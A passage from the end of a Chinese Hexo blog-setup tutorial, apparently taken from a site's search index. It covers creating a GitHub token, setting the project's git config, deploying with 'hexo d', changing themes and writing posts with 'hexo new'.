master/main</span><br></pre></td></tr></table></figure><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011052198.png" alt="图 16">  </p><h2 id="3-4、推送到Github"><a href="#3-4、推送到Github" class="headerlink" title="3.4、推送到Github"></a>3.4、推送到Github</h2><p>先在GitHub上配置一个token，更方便一些<br>登录github设置setting-&gt;Developer Settings-&gt;Prosonal access tokens 创建一个新token。</p><p>如果运行hexo d报错，是由于当前项目没有配置git的邮箱和用户名<br><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011116870.png" alt="图 17">  </p><p>接着配置一下当前项目的git</p><p>打开终端，进入自己的项目下，有个.git目录</p><p>cd 项目地址&#x2F;.git  </p><p>vim config</p><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011152216.png" alt="图 18">  </p><p>使用命令：hexo d</p><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011206779.png" alt="图 19">  </p><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011213472.png" alt="图 20">  </p><h2 id="3-5、访问blog"><a href="#3-5、访问blog" class="headerlink" title="3.5、访问blog"></a>3.5、访问blog</h2><p>当配置好之后，访问</p><p>仓库名字即可<br><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011243060.png" alt="图 21">  </p><h1 id="五、更换Blog模板"><a href="#五、更换Blog模板" class="headerlink" title="五、更换Blog模板"></a>五、更换Blog模板</h1><p>按照模板的教程来即可</p><p>到GitHub上搜索hexo主题或者hero自带的主题</p><p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h1 id="六、编写文章"><a href="#六、编写文章" class="headerlink" title="六、编写文章"></a>六、编写文章</h1><p>使用命令创建一篇文章</p><p>hexo new “xxx”<br><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011331932.png" alt="图 22">  </p><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-011346951.png" alt="图 23">  </p><h1 id="NONE"><a href="#NONE" class="headerlink" title="NONE"></a>NONE</h1><p>参考文章：</p><ul><li>Hexo-零基础搭建个人博客(详解)：〆清峰ㄟ <a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">https://blog.csdn.net/weixin_45019350/article/details/121901433</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随便写写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
